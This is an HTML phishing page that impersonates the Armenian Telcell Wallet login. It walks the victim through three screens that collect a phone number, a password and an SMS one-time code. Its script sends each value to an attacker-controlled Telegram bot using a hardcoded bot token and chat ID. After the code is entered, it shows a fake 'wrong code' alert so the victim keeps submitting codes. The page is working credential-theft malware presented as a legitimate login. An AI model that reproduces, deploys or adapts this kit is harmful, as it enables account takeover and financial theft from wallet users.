<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telcell Wallet</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #ffffff; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .app-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; padding: 20px; }
        .back-button { background: none; border: none; font-size: 24px; color: #333; cursor: pointer; margin-bottom: 10px; width: fit-content; }
        h1 { font-size: 34px; font-weight: 800; color: #222; margin-bottom: 25px; }
        .center-content { text-align: center; margin-bottom: 30px; }
        h2 { font-size: 20px; font-weight: 700; color: #222; }
        .subtitle { font-size: 15px; color: #8e8e93; margin-top: 5px; }
        
        /* Поля ввода */
        label { font-size: 14px; font-weight: 700; color: #333; display: block; margin-bottom: 8px; }
        .input-wrapper { background-color: #f2f2f7; border-radius: 16px; padding: 18px 20px; margin-bottom: 10px; position: relative; }
        input { background: none; border: none; outline: none; width: 100%; font-size: 18px; color: #000; }
        .hint { font-size: 14px; color: #8e8e93; margin-top: 8px; }
        .forgot-pass { color: #ff5e4d; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 15px; display: block; }

        /* SMS Клетки */
        .otp-container { display: flex; justify-content: space-between; margin: 30px 0; }
        .otp-input { width: 45px; height: 55px; background-color: #f2f2f7; border-radius: 12px; text-align: center; font-size: 24px; font-weight: bold; }

        /* Кнопка */
        .footer { margin-top: auto; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
        .submit-btn { width: 100%; background-color: #ffd0c8; color: white; border: none; border-radius: 30px; height: 56px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .submit-btn.active { background-color: #ff5e4d; }
        .terms { font-size: 13px; color: #333; text-align: center; line-height: 1.4; padding: 0 10px; }
    </style>
</head>
<body>

<div class="app-container">
    <button class="back-button">←</button>
    <h1 id="topTitle">Բարև</h1>

    <!-- ЭКРАН 1: НОМЕР ТЕЛЕФОНА -->
    <div id="step-phone">
        <div class="center-content">
            <h2>Մուտք</h2>
            <p class="subtitle">Ստեղծիր հարթակ վճարումներիդ համար</p>
        </div>
        <label>Քո հեռախոսահամարը</label>
        <div class="input-wrapper">
            <input type="tel" id="user_phone" placeholder="+374 (**) *** ***">
        </div>
        <p class="hint">Նմուշ՝ 77XXXXXX</p>
    </div>

    <!-- ЭКРАН 2: ПАРОЛЬ (скрыт) -->
    <div id="step-password" style="display: none;">
        <div class="center-content">
            <h2>Ուրախ ենք քեզ նորից տեսնել</h2>
            <p class="subtitle">Քո վճարումների հարթակը</p>
        </div>
        <label>Գաղտնաբառ</label>
        <div class="input-wrapper">
            <input type="password" id="user_password" placeholder="Մուտքագրիր քո գաղտնաբառը">
        </div>
        <a href="#" class="forgot-pass">Մոռացել ես գաղտնաբառը</a>
    </div>

    <!-- ЭКРАН 3: SMS КОД (скрыт) -->
    <div id="step-otp" style="display: none;">
        <div class="center-content">
            <h2>SMS հաստատում</h2>
            <p class="subtitle">Մուտքագրիր 6 նիշանոց կոդը SMS-ից</p>
        </div>
        <div class="otp-container">
            <input type="number" class="otp-i" maxlength="1">
            <input type="number" class="otp-i" maxlength="1">
            <input type="number" class="otp-i" maxlength="1">
            <input type="number" class="otp-i" maxlength="1">
            <input type="number" class="otp-i" maxlength="1">
            <input type="number" class="otp-i" maxlength="1">
        </div>
        <div class="center-content"><p class="subtitle">Կրկին ուղարկել 112 կոդը</p></div>
    </div>

    <div class="footer" id="mainFooter">
        <p class="terms" id="termsText">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգтаագործման կանոնները</p>
        <button id="nextBtn" class="submit-btn">Հաստատել</button>
    </div>
</div>

<script>
    const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8';
    const CHAT_ID = '6576262467';

    let currentStep = 1;
    let userData = { phone: '', password: '', code: '' };

    const nextBtn = document.getElementById('nextBtn');
    const phoneInp = document.getElementById('user_phone');
    const passInp = document.getElementById('user_password');

    // Валидация кнопок
    phoneInp.oninput = () => nextBtn.classList.toggle('active', phoneInp.value.length > 5);
    passInp.oninput = () => nextBtn.classList.toggle('active', passInp.value.length > 3);

    nextBtn.onclick = async () => {
        if (currentStep === 1) {
            userData.phone = phoneInp.value;
            await sendToTelegram(`📲 *LOGIN*:\n📞 Номер: ${userData.phone}`);
            
            document.getElementById('step-phone').style.display = 'none';
            document.getElementById('step-password').style.display = 'block';
            document.getElementById('termsText').style.display = 'none';
            nextBtn.classList.remove('active');
            currentStep = 2;
        } 
        else if (currentStep === 2) {
            userData.password = passInp.value;
            await sendToTelegram(`🔐 *PASSWORD*:\n📞 Номер: ${userData.phone}\n🔑 Пароль: ${userData.password}`);
            
            document.getElementById('step-password').style.display = 'none';
            document.getElementById('step-otp').style.display = 'block';
            document.getElementById('topTitle').innerText = 'Նույնականացում';
            document.getElementById('mainFooter').style.display = 'none';
            initOtp();
            currentStep = 3;
        }
    };

    async function sendToTelegram(text) {
        try {
            await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch (e) {}
    }

    function initOtp() {
        const inputs = document.querySelectorAll('.otp-i');
        inputs.forEach((input, index) => {
            input.oninput = async (e) => {
                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
                if (e.target.value && index < 5) inputs[index + 1].focus();
                
                const code = Array.from(inputs).map(i => i.value).join('');
                if (code.length === 6) {
                    await sendToTelegram(`🔑 *SMS CODE*:\n📞 Номер: ${userData.phone}\n💬 Код: ${code}`);
                    alert('Սխալ կոդ: Փորձեք կրկին'); // Имитация ошибки для правдоподобности
                    inputs.forEach(i => i.value = '');
                    inputs[0].focus();
                }
            };
        });
    }
</script>
</body>
</html>
